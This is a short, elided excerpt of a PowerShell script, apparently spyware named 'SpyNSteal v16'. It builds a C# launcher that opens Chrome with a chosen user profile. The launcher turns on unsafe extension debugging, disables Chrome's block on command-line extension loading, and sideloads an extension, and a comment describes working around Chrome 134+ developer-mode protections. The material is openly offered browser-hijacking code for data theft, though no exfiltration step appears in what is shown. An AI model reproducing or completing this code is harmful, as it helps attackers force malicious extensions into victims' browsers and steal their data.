# SpyNSteal v16 - User Data_SNS + pipe CDP + --load-extension on every launch
# Chrome 134+ needs developer_mode in Secure Preferences; CDP alone often does not flush it.
...
function Build-ChromeLaunchExe([string]$chromeExe, [string]$profileDir, [string]$extLoadPath) {
    ...
    if ($extLoadPath) {
        $argBlock = @"
            ...
            psi.Arguments = string.Format(
                "--user-data-dir=\"{{0}}\" --restore-last-session --enable-unsafe-extension-debugging --disable-features=DisableLoadExtensionCommandLineSwitch --load-extension=\"{{1}}\"",
                prof, ext);
"@
    } else {
        $argBlock = @"
            string prof = @"$profileDir";
            psi.Arguments = string.Format(
                "--user-data-dir=\"{{0}}\" --restore-last-session --enable-unsafe-extension-debugging --disable-features=DisableLoadExtensionCommandLineSwitch",
                prof);
"@
    }
